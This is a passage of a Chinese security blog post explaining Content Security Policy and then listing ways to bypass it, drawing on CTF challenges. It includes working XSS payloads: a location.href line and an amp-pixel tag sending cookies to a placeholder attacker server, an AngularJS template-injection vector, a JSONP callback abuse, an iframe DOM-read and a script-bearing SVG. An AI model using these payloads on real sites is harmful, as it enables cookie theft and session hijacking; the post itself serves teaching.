+<p><strong><code>CSP</code> 的实质就是白名单制度</strong>，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。严格规定页面中哪些资源允许有哪些资源，不在指定范围内的统统拒绝。它的实现和执行全部由浏览器完成，开发者只需提供配置。因此CSP大大增强的网页的安全性，攻击者即使发现了漏洞也没办法注入脚本，除非能想办法绕过白名单限制。</p>
+<h4 id="缓解数据包嗅探攻击"><a href="#缓解数据包嗅探攻击" class="headerlink" title="缓解数据包嗅探攻击"></a>缓解数据包嗅探攻击</h4><p>除限制可以加载内容的域，服务器还可指明哪种协议允许使用；比如（从理想化的安全角度来说），服务器可指定所有内容必须通过 HTTPS 加载。一个完整的数据安全传输策略不仅强制使用 HTTPS 进行数据传输，也为所有的 cookie 标记 <code>secure</code> 标识，并且提供自动的重定向使得 HTTP 页面导向 HTTPS 版本。网站也可以使用 <code>Strict-Transport-Security</code> HTTP 标头确保连接它的浏览器只使用加密通道。</p>
+<h3 id="使用CSP"><a href="#使用CSP" class="headerlink" title="使用CSP"></a>使用CSP</h3><p>第一种是配置内容安全策略涉及到添加 <code>Content-Security-Policy</code> HTTP 标头到一个页面，并配置相应的值，以控制用户代理（浏览器等）可以为该页面获取哪些资源。第二种是通过网页的meta标签。</p>
+<p>CSP可以由两种方式指定： HTTP Header 和 HTML。</p>
+<ul>
+<li><p>通过定义在HTTP header 中使用：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>策略集</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过定义在 HTML meta标签中使用：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-security-policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;策略集&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="Content-Security-Policy方式举例"><a href="#Content-Security-Policy方式举例" class="headerlink" title="Content-Security-Policy方式举例"></a>Content-Security-Policy方式举例</h4><ul>
+<li><p>一个网站管理者想要所有内容均来自站点的同一个源（不包括其子域名）。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>一个网站管理者允许内容来自信任的域名及其子域名（域名不必须与 CSP 设置所在的域名相同）。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27; *.trusted.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片，但是限制音频或视频需从信任的资源提供者，所有脚本必须从特定主机服务器获取可信的代码。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</span><br></pre></td></tr></table></figure>
+
+<p>在这里，各种内容默认仅允许从文档所在的源获取，但存在如下例外：</p>
+<ul>
+<li>图片可以从任何地方加载 (注意“*”通配符)。</li>
+<li>多媒体文件仅允许从 media1.com 和 media2.com 加载（不允许从这些站点的子域名）。</li>
+<li>可运行脚本仅允许来自于 userscripts.example.com。</li>
+</ul>
+</li>
+<li><p>一个管理者想要确保网站的所有内容都要通过 SSL 方式获取，以避免攻击者窃听用户发出的请求。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src https://onlinebanking.jumbobank.com</span><br></pre></td></tr></table></figure>
+
+<p>该服务器仅允许通过 HTTPS 方式并仅从 onlinebanking.jumbobank.com 域名来访问文档。</p>
+</li>
+</ul>
+<h4 id="meta标签举例"><a href="#meta标签举例" class="headerlink" title="meta标签举例"></a>meta标签举例</h4><ul>
+<li>允许自身css、js和高德地图api、地图数据。</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; https://webapi.amap.com https://restapi.amap.com https://vdata.amap.com https://appx/web-view.min.js;worker-src blob:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>总结：两种方式本质都是通过Content-Security-Policy来：</p>
+<p>​	1.配置允许的域名子域名。</p>
+<p>​	2.限制只能通过SSL方式获取</p>
+<h4 id="指令说明："><a href="#指令说明：" class="headerlink" title="指令说明："></a>指令说明：</h4><blockquote>
+<p>资源加载限制</p>
+</blockquote>
+<ul>
+<li>**<code>script-src</code>**：外部脚本</li>
+<li>**<code>style-src</code>**：样式表</li>
+<li>**<code>img-src</code>**：图像</li>
+<li>**<code>media-src</code>**：媒体文件（音频和视频）</li>
+<li>**<code>font-src</code>**：字体文件</li>
+<li>**<code>object-src</code>**：插件（比如 Flash）</li>
+<li>**<code>child-src</code>**：框架</li>
+<li>**<code>frame-ancestors</code>**：嵌入的外部资源（比如<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>） </li>
+<li>**<code>connect-src</code>**：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
+<li>**<code>worker-src</code>**：<code>worker</code>脚本</li>
+<li>**<code>manifest-src</code>**：manifest 文件</li>
+</ul>
+<blockquote>
+<p>default-src</p>
+</blockquote>
+<p><code>default-src</code>用来设置上面各个选项的默认值。如：default-src ‘self’–&gt;限制<strong>所有的</strong>外部资源，都只能从当前域名加载。</p>
+<blockquote>
+<p>其他限制</p>
+</blockquote>
+<ul>
+<li>**<code>block-all-mixed-content</code>**：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
+<li>**<code>upgrade-insecure-requests</code>**：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
+<li>**<code>plugin-types</code>**：限制可以使用的插件格式</li>
+<li>**<code>sandbox</code>**：浏览器行为的限制，比如不能有弹出窗口等。</li>
+</ul>
+<hr>
+<h3 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h3><p>看起来如果要继续尝试XSS的话第一步就是先突破CSP对跨域访问的限制。</p>
+<p>找了几种尝试绕过的方法：</p>
+<h4 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h4><p>CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用<br> 当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br></pre></td></tr></table></figure>
+
+<p>此种绕过方式适用于：已经能够执行JS脚本，需要外带数据的情况。</p>
+<blockquote>
+<p>关于此种情况还有一种基于Link标签的绕过，但是好像比较古老现在大部分浏览器已经约束此标签导致不适用了</p>
+</blockquote>
+<h4 id="Iframe绕过"><a href="#Iframe绕过" class="headerlink" title="Iframe绕过"></a>Iframe绕过</h4><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</p>
+<p>有点类似于CSRF的感觉：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">iframe.<span class="property">src</span>=<span class="string">&quot;A页面&quot;</span>;   <span class="comment">//通过iframe来操作</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="title function_">alert</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span>),<span class="number">1000</span>);    <span class="comment">//setTimeout是为了留时间给iframe加载</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="jsonp绕过"><a href="#jsonp绕过" class="headerlink" title="jsonp绕过"></a>jsonp绕过</h4><p>大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析<br> 以ins’hack 2019&#x2F;的bypasses-everywhere这道题为例，题目中的csp设置了<a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src www.google.com; img-src *; default-src &#x27;none&#x27;; style-src &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>看上去非常天衣无缝，但是google站点存在了用户可控jsonp</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src https://www.google.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google.com/complete/search？client=chrome&amp;q=hello&amp;callback=alert&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>配合注释符，我们即可执行任意js<br> 下面是一些存在用户可控资源或者jsonp比较常用站点的github项目<br> <a target="_blank" rel="noopener" href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a><br> 利用条件:</p>
+<ol>
+<li>站点存在可控Jsonp</li>
+<li>站点在CSP白名单中</li>
+</ol>
+<h4 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h4><p>一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会<strong>引用其他CDN上的JS框架</strong>，如果<strong>CDN上存在一些低版本的框架</strong>，就可能存在绕过CSP的风险</p>
+<blockquote>
+<p>举例</p>
+</blockquote>
+<ul>
+<li>某个案例中hackmd里的CSP引用了cloudflare.com CDN服务，于是采用低版本的angular js模板注入来绕过CSP，如下</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com;&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo=&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">&quot;http://your domain/?cid=CLIENT_ID(FLAG)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span>  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>补充：<a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库</a></p>
+<h4 id="SVG绕过"><a href="#SVG绕过" class="headerlink" title="SVG绕过"></a>SVG绕过</h4><p>SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">id</span>=<span class="string">&quot;Layer_1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 751 751&quot;</span> <span class="attr">enable-background</span>=<span class="string">&quot;new 0 0 751 751&quot;</span> <span class="attr">xml:space</span>=<span class="string">&quot;preserve&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">&quot;image0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;751&quot;</span> <span class="attr">height</span>=<span class="string">&quot;751&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>   //注入javasript</span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h4><p>HCTF2018的一道题，当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP<br> <a target="_blank" rel="noopener" href="https://github.com/Lou00/HCTF2018_Bottle">原题github</a></p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>还有其他的绕过方式，多出现在国外的很多CTF比赛中</p>
+<ul>
+<li>站点可控静态资源绕过</li>
+<li>Base-uri绕过</li>
+<li>不完整script标签绕过nonce</li>
+<li>object-src绕过（PDFXSS）</li>
+<li>不完整的资源标签获取资源</li>
+<li>CSS选择器获取内容</li>
+</ul>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>内容安全策略 CSP</strong>确实在一定程度上检测并削弱某些特定类型的攻击，特别是XSS和数据注入攻击等前端攻击，进一步加强了浏览器的同源策略。但是也需要开发者正确严格配置，同时绕过方式也很多。很多实战场景下直接利用location.href或者其他同站点的跳转就能成功绕过。但是其利用白名单杜绝注入脚本的思路非常正确。</p>
+<h1 id="关于前端安全的一些思考"><a href="#关于前端安全的一些思考" class="headerlink" title="关于前端安全的一些思考"></a>关于前端安全的一些思考</h1><p>前端安全看似危害很小但是很多时候往往是一个网站乃至整个域溃败的第一步。而XSS和CSRF又是前端安全问题的主要重灾区。二者在原理上有很多共性也有很多区别。</p>
+<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。归根到底就是一个信任问题，站在防护的角度，自然是尽可能的降低浏览器、客户端、服务端各自之间的信任度。或者说，严格校验这三方之间交互的过程中数据的可信度。编码，转义，增加登录验证token验证，CSP限制跨域等等都是为了实现这个问题。然而站在业务的角度上考虑，在这验证过程中又要加上用户体验感和网站服务度的考量，最终应该是各个角度综合考虑下的折中方案。</p>
+<p>总而言之，CSP策略的完善，加强同源策略的实施；和研究更加完备的方案进制第三方cookie的滥用，将是一个任重而道远的任务。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Article</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%AE%BA"><span class="toc-number">1.</span> <span class="toc-text">概论</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%90%86%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">漏洞理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80"><span class="toc-number">2.0.1.</span> <span class="toc-text">web安全基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-session%E6%9C%BA%E5%88%B6"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">Cookie&#x2F;session机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-number">2.0.2.</span> <span class="toc-text">xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.2.1.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-number">2.0.2.2.</span> <span class="toc-text">防护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">2.0.3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-1"><span class="toc-number">2.0.3.1.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-1"><span class="toc-number">2.0.3.2.</span> <span class="toc-text">防护</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%B9%E6%AF%94%E5%AD%A6%E4%B9%A0"><span class="toc-number">3.</span> <span class="toc-text">对比学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-2"><span class="toc-number">3.0.0.3.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4-2"><span class="toc-number">3.0.0.4.</span> <span class="toc-text">防护</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP"><span class="toc-number">4.</span> <span class="toc-text">CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A8%81%E8%83%81"><span class="toc-number">4.0.1.</span> <span class="toc-text">威胁</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">防止XSS攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%8C%85%E5%97%85%E6%8E%A2%E6%94%BB%E5%87%BB"><span class="toc-number">4.0.1.2.</span> <span class="toc-text">缓解数据包嗅探攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8CSP"><span class="toc-number">4.0.2.</span> <span class="toc-text">使用CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Content-Security-Policy%E6%96%B9%E5%BC%8F%E4%B8%BE%E4%BE%8B"><span class="toc-number">4.0.2.1.</span> <span class="toc-text">Content-Security-Policy方式举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#meta%E6%A0%87%E7%AD%BE%E4%B8%BE%E4%BE%8B"><span class="toc-number">4.0.2.2.</span> <span class="toc-text">meta标签举例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E8%AF%B4%E6%98%8E%EF%BC%9A"><span class="toc-number">4.0.2.3.</span> <span class="toc-text">指令说明：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87CSP"><span class="toc-number">4.0.3.</span> <span class="toc-text">绕过CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#location-href"><span class="toc-number">4.0.3.1.</span> <span class="toc-text">location.href</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Iframe%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.2.</span> <span class="toc-text">Iframe绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jsonp%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.3.</span> <span class="toc-text">jsonp绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CDN%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.4.</span> <span class="toc-text">CDN绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SVG%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.5.</span> <span class="toc-text">SVG绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CRLF%E7%BB%95%E8%BF%87"><span class="toc-number">4.0.3.6.</span> <span class="toc-text">CRLF绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">4.0.3.7.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.0.3.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">关于前端安全的一些思考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&text=一场XSS和CSRF引发的血案"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&is_video=false&description=一场XSS和CSRF引发的血案"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一场XSS和CSRF引发的血案&body=Check out this article: http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/12/21/%E4%B8%80%E5%9C%BAXSS%E5%92%8CCSRF%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/&title=一场XSS和CSRF引发的血案"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
